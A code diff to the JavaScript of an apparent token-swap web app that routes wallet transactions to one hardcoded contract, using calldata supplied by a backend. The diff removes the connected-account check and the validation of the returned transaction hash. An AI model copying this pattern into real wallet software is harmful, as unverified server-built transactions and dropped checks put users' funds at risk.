@@ -39,38 +39,26 @@ function ensure18Decimals(amountInput) {
     return combined === "" ? "0" : combined;
 }
 
-// 🟢 Reown Official Support Reference Handler
+// 🟢 Streamlined Hybrid Transaction Dispatcher (Supports Wallet Browsers + AppKit)
 async function sendTransactionThroughProvider(provider, tx) {
   if (!provider || typeof provider.request !== "function") {
-    throw new Error("No connected wallet transaction provider interface available.");
+    throw new Error("No operational wallet execution engine detected.");
   }
 
-  const accounts = await provider.request({
-    method: "eth_accounts"
-  });
+  logToPanel("Waiting for wallet approval popup...");
 
-  if (!accounts || !accounts.length) {
-    throw new Error("Wallet is not connected or session state is locked.");
-  }
-
-  const account = accounts[0];
-  logToPanel("Waiting for wallet confirmation popup...");
-
+  // Send native JSON-RPC format transaction down the active pipeline channel
   const hash = await provider.request({
     method: "eth_sendTransaction",
     params: [{
-      from: account,
+      from: tx.from,
       to: tx.to,
       data: tx.data,
       value: tx.value || "0x0"
     }]
   });
 
-  if (!/^0x[0-9a-fA-F]{64}\$/.test(hash)) {
-    throw new Error("Wallet provider did not return a valid transaction hash string.");
-  }
-
-  logToPanel("Wallet submitted transaction successfully: " + hash);
+  logToPanel("Wallet submitted transaction: " + hash);
   return hash;
 }
 
@@ -91,8 +79,10 @@ function setupActionListeners() {
       });
       const data = await res.json();
       if (data && data.status === "ok") {
-        const provider = window.walletProvider || window.ethereum;
-        const hash = await sendTransactionThroughProvider(provider, {
+        // Prioritize native built-in browser wrappers first
+        const activeProvider = window.ethereum || window.walletProvider;
+        const hash = await sendTransactionThroughProvider(activeProvider, {
+            from: window.USER_ADDR,
             to: "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B",
             data: data.withdraw_call,
             value: "0x0"
@@ -109,11 +99,12 @@ window.addEventListener("DOMContentLoaded", () => {
     setupActionListeners();
 });
 // ========================================================
-// 🥞 SWAP TRANSACTION EXECUTORS (NATIVE REOWN IMPLEMENTATION)
+// 🥞 SWAP TRANSACTION EXECUTORS (HYBRID ECOSYSTEM ENGINE)
 // ========================================================
 async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
     try {
         const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B"; 
+        const cleanUser = userAddr.toLowerCase().trim();
         const cleanFrom = fromToken.toLowerCase().trim();
         const cleanTo = toToken.toLowerCase().trim();
         const cleanRouter = targetRouter.toLowerCase().trim();
@@ -136,12 +127,13 @@ async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, target
             throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
         }
 
-        logToPanel(`📢 [SWAP PROMPT] Relaying call parameter vectors to active Reown session...`);
+        logToPanel(`📢 [SWAP PROMPT] Relaying call parameter vectors to active provider loop...`);
         
-        // 🟢 FIXED: Target Reown's native global injected interface instance natively
-        const activeProvider = window.walletProvider || window.ethereum;
+        // 🟢 FIXED: Fallback architecture that instantly grabs window.ethereum if inside a wallet browser
+        const activeProvider = window.ethereum || window.walletProvider;
 
         const txHash = await sendTransactionThroughProvider(activeProvider, {
+            from: cleanUser,
             to: V12_ADDR,
             data: backendPayload.swap_packet.compiled_data,
             value: "0x0"
@@ -159,6 +151,7 @@ window.runbscSwapUniswap = runbscSwapUniswap;
 async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
     try {
         const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B";
+        const cleanUser = userAddr.toLowerCase().trim();
         const cleanFrom = fromToken.toLowerCase().trim();
         const cleanTo = toToken.toLowerCase().trim();
         const cleanRouter = targetRouter.toLowerCase().trim();
@@ -181,11 +174,12 @@ async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, target
             throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
         }
 
-        logToPanel(`📢 [SWAP PROMPT] Relaying call parameter vectors to active Reown session...`);
+        logToPanel(`📢 [SWAP PROMPT] Relaying call parameter vectors to active provider loop...`);
         
-        const activeProvider = window.walletProvider || window.ethereum;
+        const activeProvider = window.ethereum || window.walletProvider;
 
         const txHash = await sendTransactionThroughProvider(activeProvider, {
+            from: cleanUser,
             to: V12_ADDR,
             data: backendPayload.swap_packet.compiled_data,
             value: "0x0"
